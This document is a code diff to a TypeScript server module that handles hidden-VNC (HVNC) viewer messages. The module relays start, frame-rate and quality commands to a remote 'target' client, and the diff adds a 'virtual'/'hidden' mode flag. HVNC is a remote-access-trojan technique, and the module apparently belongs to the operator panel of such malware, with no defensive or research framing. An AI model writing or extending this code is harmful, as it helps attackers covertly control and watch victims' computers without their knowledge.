@@ -774,6 +774,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
 
 type HVNCStreamingState = {
   isStreaming: boolean;
+  virtualMode: boolean;
   display: number;
   quality: number;
   codec: string;
@@ -782,7 +783,7 @@ type HVNCStreamingState = {
 };
 
 function defaultHVNCStreamingState(): HVNCStreamingState {
-  return { isStreaming: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
+  return { isStreaming: false, virtualMode: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
 }
 
 export const hvncStreamingState = new Map<string, HVNCStreamingState>();
@@ -1135,6 +1136,13 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
   logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
     case "hvnc_start":
+      {
+        const virtualMode = (payload as any).virtual_mode === true || (payload as any).hidden_mode === true;
+        if (state.isStreaming && state.virtualMode !== virtualMode) {
+          sendHVNCCommand(target, "hvnc_stop", {});
+          state.isStreaming = false;
+          logger.debug(`[hvnc] restarting stream to change virtual_mode=${state.virtualMode} -> ${virtualMode}`);
+        }
       if (!state.isStreaming) {
         if ((payload as any).webrtc === true) {
           const streamPath = webrtcStreamPathFor(clientId, "hvnc");
@@ -1156,12 +1164,15 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         sendHVNCCommand(target, "hvnc_set_fps", { fps: clampDesktopFps(state.maxFps) });
         sendHVNCCommand(target, "hvnc_start", {
           autoStartExplorer: false,
+          ...(virtualMode ? { virtual_mode: true } : {}),
         });
         state.isStreaming = true;
+        state.virtualMode = virtualMode;
         hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] started streaming for client ${clientId}`);
+        logger.debug(`[hvnc] started streaming for client ${clientId} (virtual_mode=${virtualMode})`);
       } else {
         logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
+      }
       }
       break;
     case "hvnc_stop": {
@@ -1195,8 +1206,8 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_set_quality": {
       const newQuality = Number(payload.quality) || 90;
       const newCodec = String(payload.codec || "").toLowerCase();
-      if (state.quality !== newQuality || state.codec !== newCodec) {
-        sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
+		sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
+		if (state.quality !== newQuality || state.codec !== newCodec) {
         state.quality = newQuality;
         state.codec = newCodec;
         hvncStreamingState.set(clientId, state);
@@ -1213,8 +1224,8 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       break;
     case "hvnc_set_fps": {
       const newMaxFps = clampDesktopFps((payload as any).fps);
+	  sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
       if (state.maxFps !== newMaxFps) {
-        sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
         state.maxFps = newMaxFps;
         hvncStreamingState.set(clientId, state);
         logger.debug(`[hvnc] set target fps=${newMaxFps}`);
